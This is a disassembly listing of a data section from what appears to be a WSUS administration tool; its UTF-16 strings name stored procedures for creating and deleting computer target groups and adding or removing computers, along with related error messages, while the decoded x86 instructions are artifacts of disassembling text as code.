  40ac39:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40ac3f:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40ac45:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40ac4b:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40ac51:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40ac57:	00 01                	add    %al,(%ecx)
  40ac59:	15 43 00 6f 00       	adc    $0x6f0043,%eax
  40ac5e:	6d                   	insl   (%dx),%es:(%edi)
  40ac5f:	00 70 00             	add    %dh,0x0(%eax)
  40ac62:	75 00                	jne    0x40ac64
  40ac64:	74 00                	je     0x40ac66
  40ac66:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40ac6a:	49                   	dec    %ecx
  40ac6b:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40ac6f:	45                   	inc    %ebp
  40ac70:	53                   	push   %ebx
  40ac71:	00 45 00             	add    %al,0x0(%ebp)
  40ac74:	4c                   	dec    %esp
  40ac75:	00 45 00             	add    %al,0x0(%ebp)
  40ac78:	43                   	inc    %ebx
  40ac79:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  40ac7d:	00 64 00 62          	add    %ah,0x62(%eax,%eax,1)
  40ac81:	00 6f 00             	add    %ch,0x0(%edi)
  40ac84:	2e 00 66 00          	add    %ah,%cs:0x0(%esi)
  40ac88:	6e                   	outsb  %ds:(%esi),(%dx)
  40ac89:	00 47 00             	add    %al,0x0(%edi)
  40ac8c:	65 00 74 00 43       	add    %dh,%gs:0x43(%eax,%eax,1)
  40ac91:	00 6f 00             	add    %ch,0x0(%edi)
  40ac94:	6d                   	insl   (%dx),%es:(%edi)
  40ac95:	00 70 00             	add    %dh,0x0(%eax)
  40ac98:	75 00                	jne    0x40ac9a
  40ac9a:	74 00                	je     0x40ac9c
  40ac9c:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40aca0:	54                   	push   %esp
  40aca1:	00 61 00             	add    %ah,0x0(%ecx)
  40aca4:	72 00                	jb     0x40aca6
  40aca6:	67 00 65 00          	add    %ah,0x0(%di)
  40acaa:	74 00                	je     0x40acac
  40acac:	49                   	dec    %ecx
  40acad:	00 44 00 28          	add    %al,0x28(%eax,%eax,1)
  40acb1:	00 27                	add    %ah,(%edi)
  40acb3:	00 01                	add    %al,(%ecx)
  40acb5:	05 27 00 29 00       	add    $0x290027,%eax
  40acba:	01 80 c1 49 00 6e    	add    %eax,0x6e0049c1(%eax)
  40acc0:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40acc4:	00 72 00             	add    %dh,0x0(%edx)
  40acc7:	6e                   	outsb  %ds:(%esi),(%dx)
  40acc8:	00 61 00             	add    %ah,0x0(%ecx)
  40accb:	6c                   	insb   (%dx),%es:(%edi)
  40accc:	00 20                	add    %ah,(%eax)
  40acce:	00 57 00             	add    %dl,0x0(%edi)
  40acd1:	53                   	push   %ebx
  40acd2:	00 55 00             	add    %dl,0x0(%ebp)
  40acd5:	53                   	push   %ebx
  40acd6:	00 20                	add    %ah,(%eax)
  40acd8:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40acdc:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40ace0:	00 62 00             	add    %ah,0x0(%edx)
  40ace3:	61                   	popa
  40ace4:	00 73 00             	add    %dh,0x0(%ebx)
  40ace7:	65 00 20             	add    %ah,%gs:(%eax)
  40acea:	00 65 00             	add    %ah,0x0(%ebp)
  40aced:	72 00                	jb     0x40acef
  40acef:	72 00                	jb     0x40acf1
  40acf1:	6f                   	outsl  %ds:(%esi),(%dx)
  40acf2:	00 72 00             	add    %dh,0x0(%edx)
  40acf5:	20 00                	and    %al,(%eax)
  40acf7:	2d 00 20 00 54       	sub    $0x54002000,%eax
  40acfc:	00 61 00             	add    %ah,0x0(%ecx)
  40acff:	72 00                	jb     0x40ad01
  40ad01:	67 00 65 00          	add    %ah,0x0(%di)
  40ad05:	74 00                	je     0x40ad07
  40ad07:	20 00                	and    %al,(%eax)
  40ad09:	63 00                	arpl   %eax,(%eax)
  40ad0b:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad0c:	00 6d 00             	add    %ch,0x0(%ebp)
  40ad0f:	70 00                	jo     0x40ad11
  40ad11:	75 00                	jne    0x40ad13
  40ad13:	74 00                	je     0x40ad15
  40ad15:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40ad19:	20 00                	and    %al,(%eax)
  40ad1b:	7b 00                	jnp    0x40ad1d
  40ad1d:	30 00                	xor    %al,(%eax)
  40ad1f:	7d 00                	jge    0x40ad21
  40ad21:	20 00                	and    %al,(%eax)
  40ad23:	68 00 61 00 73       	push   $0x73006100
  40ad28:	00 20                	add    %ah,(%eax)
  40ad2a:	00 43 00             	add    %al,0x0(%ebx)
  40ad2d:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad2e:	00 6d 00             	add    %ch,0x0(%ebp)
  40ad31:	70 00                	jo     0x40ad33
  40ad33:	75 00                	jne    0x40ad35
  40ad35:	74 00                	je     0x40ad37
  40ad37:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40ad3b:	49                   	dec    %ecx
  40ad3c:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  40ad40:	00 7b 00             	add    %bh,0x0(%ebx)
  40ad43:	31 00                	xor    %eax,(%eax)
  40ad45:	7d 00                	jge    0x40ad47
  40ad47:	20 00                	and    %al,(%eax)
  40ad49:	62 00                	bound  %eax,(%eax)
  40ad4b:	75 00                	jne    0x40ad4d
  40ad4d:	74 00                	je     0x40ad4f
  40ad4f:	20 00                	and    %al,(%eax)
  40ad51:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
  40ad55:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40ad59:	20 00                	and    %al,(%eax)
  40ad5b:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad5c:	00 6f 00             	add    %ch,0x0(%edi)
  40ad5f:	74 00                	je     0x40ad61
  40ad61:	20 00                	and    %al,(%eax)
  40ad63:	68 00 61 00 76       	push   $0x76006100
  40ad68:	00 65 00             	add    %ah,0x0(%ebp)
  40ad6b:	20 00                	and    %al,(%eax)
  40ad6d:	54                   	push   %esp
  40ad6e:	00 61 00             	add    %ah,0x0(%ecx)
  40ad71:	72 00                	jb     0x40ad73
  40ad73:	67 00 65 00          	add    %ah,0x0(%di)
  40ad77:	74 00                	je     0x40ad79
  40ad79:	49                   	dec    %ecx
  40ad7a:	00 44 00 01          	add    %al,0x1(%eax,%eax,1)
  40ad7e:	49                   	dec    %ecx
  40ad7f:	54                   	push   %esp
  40ad80:	00 61 00             	add    %ah,0x0(%ecx)
  40ad83:	72 00                	jb     0x40ad85
  40ad85:	67 00 65 00          	add    %ah,0x0(%di)
  40ad89:	74 00                	je     0x40ad8b
  40ad8b:	20 00                	and    %al,(%eax)
  40ad8d:	63 00                	arpl   %eax,(%eax)
  40ad8f:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad90:	00 6d 00             	add    %ch,0x0(%ebp)
  40ad93:	70 00                	jo     0x40ad95
  40ad95:	75 00                	jne    0x40ad97
  40ad97:	74 00                	je     0x40ad99
  40ad99:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40ad9d:	20 00                	and    %al,(%eax)
  40ad9f:	63 00                	arpl   %eax,(%eax)
  40ada1:	61                   	popa
  40ada2:	00 6e 00             	add    %ch,0x0(%esi)
  40ada5:	6e                   	outsb  %ds:(%esi),(%dx)
  40ada6:	00 6f 00             	add    %ch,0x0(%edi)
  40ada9:	74 00                	je     0x40adab
  40adab:	20 00                	and    %al,(%eax)
  40adad:	62 00                	bound  %eax,(%eax)
  40adaf:	65 00 20             	add    %ah,%gs:(%eax)
  40adb2:	00 66 00             	add    %ah,0x0(%esi)
  40adb5:	6f                   	outsl  %ds:(%esi),(%dx)
  40adb6:	00 75 00             	add    %dh,0x0(%ebp)
  40adb9:	6e                   	outsb  %ds:(%esi),(%dx)
  40adba:	00 64 00 3a          	add    %ah,0x3a(%eax,%eax,1)
  40adbe:	00 20                	add    %ah,(%eax)
  40adc0:	00 7b 00             	add    %bh,0x0(%ebx)
  40adc3:	30 00                	xor    %al,(%eax)
  40adc5:	7d 00                	jge    0x40adc7
  40adc7:	00 4f 0d             	add    %cl,0xd(%edi)
  40adca:	00 0a                	add    %cl,(%edx)
  40adcc:	00 46 00             	add    %al,0x0(%esi)
  40adcf:	75 00                	jne    0x40add1
  40add1:	6e                   	outsb  %ds:(%esi),(%dx)
  40add2:	00 63 00             	add    %ah,0x0(%ebx)
  40add5:	74 00                	je     0x40add7
  40add7:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40addd:	20 00                	and    %al,(%eax)
  40addf:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40ade3:	72 00                	jb     0x40ade5
  40ade5:	6f                   	outsl  %ds:(%esi),(%dx)
  40ade6:	00 72 00             	add    %dh,0x0(%edx)
  40ade9:	20 00                	and    %al,(%eax)
  40adeb:	2d 00 20 00 46       	sub    $0x46002000,%eax
  40adf0:	00 62 00             	add    %ah,0x0(%edx)
  40adf3:	47                   	inc    %edi
  40adf4:	00 65 00             	add    %ah,0x0(%ebp)
  40adf7:	74 00                	je     0x40adf9
  40adf9:	43                   	inc    %ebx
  40adfa:	00 6f 00             	add    %ch,0x0(%edi)
  40adfd:	6d                   	insl   (%dx),%es:(%edi)
  40adfe:	00 70 00             	add    %dh,0x0(%eax)
  40ae01:	75 00                	jne    0x40ae03
  40ae03:	74 00                	je     0x40ae05
  40ae05:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40ae09:	54                   	push   %esp
  40ae0a:	00 61 00             	add    %ah,0x0(%ecx)
  40ae0d:	72 00                	jb     0x40ae0f
  40ae0f:	67 00 65 00          	add    %ah,0x0(%di)
  40ae13:	74 00                	je     0x40ae15
  40ae15:	2e 00 01             	add    %al,%cs:(%ecx)
  40ae18:	1b 54 00 61          	sbb    0x61(%eax,%eax,1),%edx
  40ae1c:	00 72 00             	add    %dh,0x0(%edx)
  40ae1f:	67 00 65 00          	add    %ah,0x0(%di)
  40ae23:	74 00                	je     0x40ae25
  40ae25:	47                   	inc    %edi
  40ae26:	00 72 00             	add    %dh,0x0(%edx)
  40ae29:	6f                   	outsl  %ds:(%esi),(%dx)
  40ae2a:	00 75 00             	add    %dh,0x0(%ebp)
  40ae2d:	70 00                	jo     0x40ae2f
  40ae2f:	49                   	dec    %ecx
  40ae30:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40ae34:	3f                   	aas
  40ae35:	0d 00 0a 00 47       	or     $0x47000a00,%eax
  40ae3a:	00 72 00             	add    %dh,0x0(%edx)
  40ae3d:	6f                   	outsl  %ds:(%esi),(%dx)
  40ae3e:	00 75 00             	add    %dh,0x0(%ebp)
  40ae41:	70 00                	jo     0x40ae43
  40ae43:	20 00                	and    %al,(%eax)
  40ae45:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
  40ae49:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40ae4d:	20 00                	and    %al,(%eax)
  40ae4f:	6e                   	outsb  %ds:(%esi),(%dx)
  40ae50:	00 6f 00             	add    %ch,0x0(%edi)
  40ae53:	74 00                	je     0x40ae55
  40ae55:	20 00                	and    %al,(%eax)
  40ae57:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40ae5b:	69 00 73 00 74 00    	imul   $0x740073,(%eax),%eax
  40ae61:	20 00                	and    %al,(%eax)
  40ae63:	61                   	popa
  40ae64:	00 6c 00 72          	add    %ch,0x72(%eax,%eax,1)
  40ae68:	00 65 00             	add    %ah,0x0(%ebp)
  40ae6b:	61                   	popa
  40ae6c:	00 64 00 79          	add    %ah,0x79(%eax,%eax,1)
  40ae70:	00 2e                	add    %ch,(%esi)
  40ae72:	00 00                	add    %al,(%eax)
  40ae74:	41                   	inc    %ecx
  40ae75:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40ae79:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40ae7d:	20 00                	and    %al,(%eax)
  40ae7f:	73 00                	jae    0x40ae81
  40ae81:	70 00                	jo     0x40ae83
  40ae83:	43                   	inc    %ebx
  40ae84:	00 72 00             	add    %dh,0x0(%edx)
  40ae87:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40ae8b:	74 00                	je     0x40ae8d
  40ae8d:	65 00 54 00 61       	add    %dl,%gs:0x61(%eax,%eax,1)
  40ae92:	00 72 00             	add    %dh,0x0(%edx)
  40ae95:	67 00 65 00          	add    %ah,0x0(%di)
  40ae99:	74 00                	je     0x40ae9b
  40ae9b:	47                   	inc    %edi
  40ae9c:	00 72 00             	add    %dh,0x0(%edx)
  40ae9f:	6f                   	outsl  %ds:(%esi),(%dx)
  40aea0:	00 75 00             	add    %dh,0x0(%ebp)
  40aea3:	70 00                	jo     0x40aea5
  40aea5:	20 00                	and    %al,(%eax)
  40aea7:	40                   	inc    %eax
  40aea8:	00 6e 00             	add    %ch,0x0(%esi)
  40aeab:	61                   	popa
  40aeac:	00 6d 00             	add    %ch,0x0(%ebp)
  40aeaf:	65 00 3d 00 27 00 01 	add    %bh,%gs:0x1002700
  40aeb6:	11 27                	adc    %esp,(%edi)
  40aeb8:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40aebb:	20 00                	and    %al,(%eax)
  40aebd:	40                   	inc    %eax
  40aebe:	00 69 00             	add    %ch,0x0(%ecx)
  40aec1:	64 00 3d 00 27 00 01 	add    %bh,%fs:0x1002700
  40aec8:	25 47 00 72 00       	and    $0x720047,%eax
  40aecd:	6f                   	outsl  %ds:(%esi),(%dx)
  40aece:	00 75 00             	add    %dh,0x0(%ebp)
  40aed1:	70 00                	jo     0x40aed3
  40aed3:	20 00                	and    %al,(%eax)
  40aed5:	43                   	inc    %ebx
  40aed6:	00 72 00             	add    %dh,0x0(%edx)
  40aed9:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40aedd:	74 00                	je     0x40aedf
  40aedf:	65 00 64 00 3a       	add    %ah,%gs:0x3a(%eax,%eax,1)
  40aee4:	00 20                	add    %ah,(%eax)
  40aee6:	00 7b 00             	add    %bh,0x0(%ebx)
  40aee9:	30 00                	xor    %al,(%eax)
  40aeeb:	7d 00                	jge    0x40aeed
  40aeed:	00 43 0d             	add    %al,0xd(%ebx)
  40aef0:	00 0a                	add    %cl,(%edx)
  40aef2:	00 46 00             	add    %al,0x0(%esi)
  40aef5:	75 00                	jne    0x40aef7
  40aef7:	6e                   	outsb  %ds:(%esi),(%dx)
  40aef8:	00 63 00             	add    %ah,0x0(%ebx)
  40aefb:	74 00                	je     0x40aefd
  40aefd:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40af03:	20 00                	and    %al,(%eax)
  40af05:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40af09:	72 00                	jb     0x40af0b
  40af0b:	6f                   	outsl  %ds:(%esi),(%dx)
  40af0c:	00 72 00             	add    %dh,0x0(%edx)
  40af0f:	20 00                	and    %al,(%eax)
  40af11:	2d 00 20 00 46       	sub    $0x46002000,%eax
  40af16:	00 62 00             	add    %ah,0x0(%edx)
  40af19:	43                   	inc    %ebx
  40af1a:	00 72 00             	add    %dh,0x0(%edx)
  40af1d:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40af21:	74 00                	je     0x40af23
  40af23:	65 00 47 00          	add    %al,%gs:0x0(%edi)
  40af27:	72 00                	jb     0x40af29
  40af29:	6f                   	outsl  %ds:(%esi),(%dx)
  40af2a:	00 75 00             	add    %dh,0x0(%ebp)
  40af2d:	70 00                	jo     0x40af2f
  40af2f:	2e 00 01             	add    %al,%cs:(%ecx)
  40af32:	53                   	push   %ebx
  40af33:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40af37:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40af3b:	20 00                	and    %al,(%eax)
  40af3d:	73 00                	jae    0x40af3f
  40af3f:	70 00                	jo     0x40af41
  40af41:	44                   	inc    %esp
  40af42:	00 65 00             	add    %ah,0x0(%ebp)
  40af45:	6c                   	insb   (%dx),%es:(%edi)
  40af46:	00 65 00             	add    %ah,0x0(%ebp)
  40af49:	74 00                	je     0x40af4b
  40af4b:	65 00 54 00 61       	add    %dl,%gs:0x61(%eax,%eax,1)
  40af50:	00 72 00             	add    %dh,0x0(%edx)
  40af53:	67 00 65 00          	add    %ah,0x0(%di)
  40af57:	74 00                	je     0x40af59
  40af59:	47                   	inc    %edi
  40af5a:	00 72 00             	add    %dh,0x0(%edx)
  40af5d:	6f                   	outsl  %ds:(%esi),(%dx)
  40af5e:	00 75 00             	add    %dh,0x0(%ebp)
  40af61:	70 00                	jo     0x40af63
  40af63:	20 00                	and    %al,(%eax)
  40af65:	40                   	inc    %eax
  40af66:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40af6a:	00 72 00             	add    %dh,0x0(%edx)
  40af6d:	67 00 65 00          	add    %ah,0x0(%di)
  40af71:	74 00                	je     0x40af73
  40af73:	47                   	inc    %edi
  40af74:	00 72 00             	add    %dh,0x0(%edx)
  40af77:	6f                   	outsl  %ds:(%esi),(%dx)
  40af78:	00 75 00             	add    %dh,0x0(%ebp)
  40af7b:	70 00                	jo     0x40af7d
  40af7d:	49                   	dec    %ecx
  40af7e:	00 44 00 3d          	add    %al,0x3d(%eax,%eax,1)
  40af82:	00 27                	add    %ah,(%edi)
  40af84:	00 01                	add    %al,(%ecx)
  40af86:	19 52 00             	sbb    %edx,0x0(%edx)
  40af89:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40af8d:	6f                   	outsl  %ds:(%esi),(%dx)
  40af8e:	00 76 00             	add    %dh,0x0(%esi)
  40af91:	65 00 20             	add    %ah,%gs:(%eax)
  40af94:	00 47 00             	add    %al,0x0(%edi)
  40af97:	72 00                	jb     0x40af99
  40af99:	6f                   	outsl  %ds:(%esi),(%dx)
  40af9a:	00 75 00             	add    %dh,0x0(%ebp)
  40af9d:	70 00                	jo     0x40af9f
  40af9f:	00 43 0d             	add    %al,0xd(%ebx)
  40afa2:	00 0a                	add    %cl,(%edx)
  40afa4:	00 46 00             	add    %al,0x0(%esi)
  40afa7:	75 00                	jne    0x40afa9
  40afa9:	6e                   	outsb  %ds:(%esi),(%dx)
  40afaa:	00 63 00             	add    %ah,0x0(%ebx)
  40afad:	74 00                	je     0x40afaf
  40afaf:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40afb5:	20 00                	and    %al,(%eax)
  40afb7:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40afbb:	72 00                	jb     0x40afbd
  40afbd:	6f                   	outsl  %ds:(%esi),(%dx)
  40afbe:	00 72 00             	add    %dh,0x0(%edx)
  40afc1:	20 00                	and    %al,(%eax)
  40afc3:	2d 00 20 00 46       	sub    $0x46002000,%eax
  40afc8:	00 62 00             	add    %ah,0x0(%edx)
  40afcb:	52                   	push   %edx
  40afcc:	00 65 00             	add    %ah,0x0(%ebp)
  40afcf:	6d                   	insl   (%dx),%es:(%edi)
  40afd0:	00 6f 00             	add    %ch,0x0(%edi)
  40afd3:	76 00                	jbe    0x40afd5
  40afd5:	65 00 47 00          	add    %al,%gs:0x0(%edi)
  40afd9:	72 00                	jb     0x40afdb
  40afdb:	6f                   	outsl  %ds:(%esi),(%dx)
  40afdc:	00 75 00             	add    %dh,0x0(%ebp)
  40afdf:	70 00                	jo     0x40afe1
  40afe1:	2e 00 01             	add    %al,%cs:(%ecx)
  40afe4:	5d                   	pop    %ebp
  40afe5:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40afe9:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40afed:	20 00                	and    %al,(%eax)
  40afef:	73 00                	jae    0x40aff1
  40aff1:	70 00                	jo     0x40aff3
  40aff3:	41                   	inc    %ecx
  40aff4:	00 64 00 64          	add    %ah,0x64(%eax,%eax,1)
  40aff8:	00 54 00 61          	add    %dl,0x61(%eax,%eax,1)
  40affc:	00 72 00             	add    %dh,0x0(%edx)
  40afff:	67 00 65 00          	add    %ah,0x0(%di)
  40b003:	74 00                	je     0x40b005
  40b005:	54                   	push   %esp
  40b006:	00 6f 00             	add    %ch,0x0(%edi)
  40b009:	54                   	push   %esp
  40b00a:	00 61 00             	add    %ah,0x0(%ecx)
  40b00d:	72 00                	jb     0x40b00f
  40b00f:	67 00 65 00          	add    %ah,0x0(%di)
  40b013:	74 00                	je     0x40b015
  40b015:	47                   	inc    %edi
  40b016:	00 72 00             	add    %dh,0x0(%edx)
  40b019:	6f                   	outsl  %ds:(%esi),(%dx)
  40b01a:	00 75 00             	add    %dh,0x0(%ebp)
  40b01d:	70 00                	jo     0x40b01f
  40b01f:	20 00                	and    %al,(%eax)
  40b021:	40                   	inc    %eax
  40b022:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40b026:	00 72 00             	add    %dh,0x0(%edx)
  40b029:	67 00 65 00          	add    %ah,0x0(%di)
  40b02d:	74 00                	je     0x40b02f
  40b02f:	47                   	inc    %edi
  40b030:	00 72 00             	add    %dh,0x0(%edx)
  40b033:	6f                   	outsl  %ds:(%esi),(%dx)
  40b034:	00 75 00             	add    %dh,0x0(%ebp)
  40b037:	70 00                	jo     0x40b039
  40b039:	49                   	dec    %ecx
  40b03a:	00 44 00 3d          	add    %al,0x3d(%eax,%eax,1)
  40b03e:	00 27                	add    %ah,(%edi)
  40b040:	00 01                	add    %al,(%ecx)
  40b042:	1b 27                	sbb    (%edi),%esp
  40b044:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40b047:	20 00                	and    %al,(%eax)
  40b049:	40                   	inc    %eax
  40b04a:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40b04e:	00 72 00             	add    %dh,0x0(%edx)
  40b051:	67 00 65 00          	add    %ah,0x0(%di)
  40b055:	74 00                	je     0x40b057
  40b057:	49                   	dec    %ecx
  40b058:	00 44 00 3d          	add    %al,0x3d(%eax,%eax,1)
  40b05c:	00 01                	add    %al,(%ecx)
  40b05e:	2f                   	das
  40b05f:	41                   	inc    %ecx
  40b060:	00 64 00 64          	add    %ah,0x64(%eax,%eax,1)
  40b064:	00 65 00             	add    %ah,0x0(%ebp)
  40b067:	64 00 20             	add    %ah,%fs:(%eax)
  40b06a:	00 43 00             	add    %al,0x0(%ebx)
  40b06d:	6f                   	outsl  %ds:(%esi),(%dx)
  40b06e:	00 6d 00             	add    %ch,0x0(%ebp)
  40b071:	70 00                	jo     0x40b073
  40b073:	75 00                	jne    0x40b075
  40b075:	74 00                	je     0x40b077
  40b077:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b07b:	20 00                	and    %al,(%eax)
  40b07d:	54                   	push   %esp
  40b07e:	00 6f 00             	add    %ch,0x0(%edi)
  40b081:	20 00                	and    %al,(%eax)
  40b083:	47                   	inc    %edi
  40b084:	00 72 00             	add    %dh,0x0(%edx)
  40b087:	6f                   	outsl  %ds:(%esi),(%dx)
  40b088:	00 75 00             	add    %dh,0x0(%ebp)
  40b08b:	70 00                	jo     0x40b08d
  40b08d:	00 51 0d             	add    %dl,0xd(%ecx)
  40b090:	00 0a                	add    %cl,(%edx)
  40b092:	00 46 00             	add    %al,0x0(%esi)
  40b095:	75 00                	jne    0x40b097
  40b097:	6e                   	outsb  %ds:(%esi),(%dx)
  40b098:	00 63 00             	add    %ah,0x0(%ebx)
  40b09b:	74 00                	je     0x40b09d
  40b09d:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40b0a3:	20 00                	and    %al,(%eax)
  40b0a5:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b0a9:	72 00                	jb     0x40b0ab
  40b0ab:	6f                   	outsl  %ds:(%esi),(%dx)
  40b0ac:	00 72 00             	add    %dh,0x0(%edx)
  40b0af:	20 00                	and    %al,(%eax)
  40b0b1:	2d 00 20 00 46       	sub    $0x46002000,%eax
  40b0b6:	00 62 00             	add    %ah,0x0(%edx)
  40b0b9:	41                   	inc    %ecx
  40b0ba:	00 64 00 64          	add    %ah,0x64(%eax,%eax,1)
  40b0be:	00 43 00             	add    %al,0x0(%ebx)
  40b0c1:	6f                   	outsl  %ds:(%esi),(%dx)
  40b0c2:	00 6d 00             	add    %ch,0x0(%ebp)
  40b0c5:	70 00                	jo     0x40b0c7
  40b0c7:	75 00                	jne    0x40b0c9
  40b0c9:	74 00                	je     0x40b0cb
  40b0cb:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b0cf:	54                   	push   %esp
  40b0d0:	00 6f 00             	add    %ch,0x0(%edi)
  40b0d3:	47                   	inc    %edi
  40b0d4:	00 72 00             	add    %dh,0x0(%edx)
  40b0d7:	6f                   	outsl  %ds:(%esi),(%dx)
  40b0d8:	00 75 00             	add    %dh,0x0(%ebp)
  40b0db:	70 00                	jo     0x40b0dd
  40b0dd:	2e 00 01             	add    %al,%cs:(%ecx)
  40b0e0:	67 65 00 78 00       	add    %bh,%gs:0x0(%bx,%si)
  40b0e5:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40b0e9:	20 00                	and    %al,(%eax)
  40b0eb:	73 00                	jae    0x40b0ed
  40b0ed:	70 00                	jo     0x40b0ef
  40b0ef:	52                   	push   %edx
  40b0f0:	00 65 00             	add    %ah,0x0(%ebp)
  40b0f3:	6d                   	insl   (%dx),%es:(%edi)
  40b0f4:	00 6f 00             	add    %ch,0x0(%edi)
  40b0f7:	76 00                	jbe    0x40b0f9
  40b0f9:	65 00 54 00 61       	add    %dl,%gs:0x61(%eax,%eax,1)
  40b0fe:	00 72 00             	add    %dh,0x0(%edx)
  40b101:	67 00 65 00          	add    %ah,0x0(%di)
  40b105:	74 00                	je     0x40b107
  40b107:	46                   	inc    %esi
  40b108:	00 72 00             	add    %dh,0x0(%edx)
  40b10b:	6f                   	outsl  %ds:(%esi),(%dx)
  40b10c:	00 6d 00             	add    %ch,0x0(%ebp)
  40b10f:	54                   	push   %esp
  40b110:	00 61 00             	add    %ah,0x0(%ecx)
  40b113:	72 00                	jb     0x40b115
  40b115:	67 00 65 00          	add    %ah,0x0(%di)
  40b119:	74 00                	je     0x40b11b
  40b11b:	47                   	inc    %edi
  40b11c:	00 72 00             	add    %dh,0x0(%edx)
  40b11f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b120:	00 75 00             	add    %dh,0x0(%ebp)
  40b123:	70 00                	jo     0x40b125
  40b125:	20 00                	and    %al,(%eax)
  40b127:	40                   	inc    %eax
  40b128:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40b12c:	00 72 00             	add    %dh,0x0(%edx)
  40b12f:	67 00 65 00          	add    %ah,0x0(%di)
  40b133:	74 00                	je     0x40b135
  40b135:	47                   	inc    %edi
  40b136:	00 72 00             	add    %dh,0x0(%edx)
  40b139:	6f                   	outsl  %ds:(%esi),(%dx)
  40b13a:	00 75 00             	add    %dh,0x0(%ebp)
  40b13d:	70 00                	jo     0x40b13f
  40b13f:	49                   	dec    %ecx
  40b140:	00 44 00 3d          	add    %al,0x3d(%eax,%eax,1)
  40b144:	00 27                	add    %ah,(%edi)
  40b146:	00 01                	add    %al,(%ecx)
  40b148:	37                   	aaa
  40b149:	52                   	push   %edx
  40b14a:	00 65 00             	add    %ah,0x0(%ebp)
  40b14d:	6d                   	insl   (%dx),%es:(%edi)
  40b14e:	00 6f 00             	add    %ch,0x0(%edi)
  40b151:	76 00                	jbe    0x40b153
  40b153:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  40b158:	00 43 00             	add    %al,0x0(%ebx)
  40b15b:	6f                   	outsl  %ds:(%esi),(%dx)
  40b15c:	00 6d 00             	add    %ch,0x0(%ebp)
  40b15f:	70 00                	jo     0x40b161
  40b161:	75 00                	jne    0x40b163
  40b163:	74 00                	je     0x40b165
  40b165:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b169:	20 00                	and    %al,(%eax)
  40b16b:	46                   	inc    %esi
  40b16c:	00 72 00             	add    %dh,0x0(%edx)
  40b16f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b170:	00 6d 00             	add    %ch,0x0(%ebp)
  40b173:	20 00                	and    %al,(%eax)
  40b175:	47                   	inc    %edi
  40b176:	00 72 00             	add    %dh,0x0(%edx)
  40b179:	6f                   	outsl  %ds:(%esi),(%dx)
  40b17a:	00 75 00             	add    %dh,0x0(%ebp)
  40b17d:	70 00                	jo     0x40b17f
  40b17f:	00 5b 0d             	add    %bl,0xd(%ebx)
  40b182:	00 0a                	add    %cl,(%edx)
  40b184:	00 46 00             	add    %al,0x0(%esi)
  40b187:	75 00                	jne    0x40b189
  40b189:	6e                   	outsb  %ds:(%esi),(%dx)
  40b18a:	00 63 00             	add    %ah,0x0(%ebx)
  40b18d:	74 00                	je     0x40b18f
  40b18f:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40b195:	20 00                	and    %al,(%eax)
  40b197:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b19b:	72 00                	jb     0x40b19d
  40b19d:	6f                   	outsl  %ds:(%esi),(%dx)
  40b19e:	00 72 00             	add    %dh,0x0(%edx)
  40b1a1:	20 00                	and    %al,(%eax)
  40b1a3:	2d 00 20 00 46       	sub    $0x46002000,%eax
  40b1a8:	00 62 00             	add    %ah,0x0(%edx)
  40b1ab:	52                   	push   %edx
  40b1ac:	00 65 00             	add    %ah,0x0(%ebp)
  40b1af:	6d                   	insl   (%dx),%es:(%edi)
